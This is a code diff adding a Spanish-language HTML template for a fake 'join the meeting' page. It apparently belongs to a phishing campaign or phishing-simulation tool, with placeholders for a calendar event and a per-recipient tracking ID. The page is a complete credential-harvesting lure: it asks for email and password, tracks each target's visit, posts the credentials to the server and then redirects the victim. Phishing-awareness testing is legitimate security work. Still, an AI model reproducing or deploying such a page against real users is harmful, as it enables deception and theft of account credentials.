@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unirse a la Reunión</title>
+    <link rel="stylesheet" href="/static/css/calendar-phishing.css">
+</head>
+<body>
+    <div class="container">
+        <div class="meeting-card">
+            <div class="meeting-header">
+                <svg class="meeting-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                    <line x1="16" y1="2" x2="16" y2="6"></line>
+                    <line x1="8" y1="2" x2="8" y2="6"></line>
+                    <line x1="3" y1="10" x2="21" y2="10"></line>
+                </svg>
+                <h1>Unirse a la Reunión</h1>
+            </div>
+            
+            <div class="meeting-info">
+                <h2>{{.EventTitle}}</h2>
+                <p class="meeting-time">{{.EventTime}}</p>
+                <p class="meeting-organizer">Organizado por: {{.OrganizerName}}</p>
+            </div>
+
+            <div class="auth-section">
+                <p class="auth-message">Por favor, ingrese sus credenciales para unirse</p>
+                
+                <form id="credentialsForm" method="POST">
+                    <div class="form-group">
+                        <label for="email">Correo electrónico</label>
+                        <input type="email" id="email" name="email" required placeholder="tu.email@empresa.com">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password">Contraseña</label>
+                        <input type="password" id="password" name="password" required placeholder="Contraseña">
+                    </div>
+                    
+                    <button type="submit" class="submit-btn">Unirse Ahora</button>
+                </form>
+            </div>
+            
+            <div class="footer">
+                <p>Si tiene problemas para unirse, contacte al organizador</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Track page load
+        fetch('/calendar/track?rid={{.RID}}&event=page_loaded').catch(() => {});
+        
+        // Handle form submission
+        document.getElementById('credentialsForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const formData = new FormData(this);
+            
+            fetch(window.location.href, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.redirect) {
+                    window.location.href = data.redirect;
+                } else {
+                    window.location.href = '/';
+                }
+            })
+            .catch(() => {
+                // Fallback redirect
+                window.location.href = '/';
+            });
+        });
+    </script>
+</body>
+</html>
